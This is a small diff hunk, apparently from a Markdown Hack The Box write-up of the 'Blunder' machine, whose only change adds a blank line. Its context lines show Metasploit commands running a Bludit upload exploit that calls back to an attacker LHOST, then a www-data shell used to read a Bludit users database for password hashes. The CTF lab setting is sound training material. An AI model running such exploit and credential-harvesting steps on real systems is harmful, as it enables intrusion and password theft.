@@ -253,6 +253,7 @@ for password in wordlist:
 >     msf5 exploit(linux/http/bludit_upload_images_exec) > set LHOST 10.10.14.161
 >     msf5 exploit(linux/http/bludit_upload_images_exec) > exploit
 ---
+
 ![picture3](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/blunder/8.png)
 
 - We are `www-data` shell. Enumerate internal system into `/var/www/bludit-3.10.0a/bl-content/databases/users.php` and we have password hashes of `Hugo`.
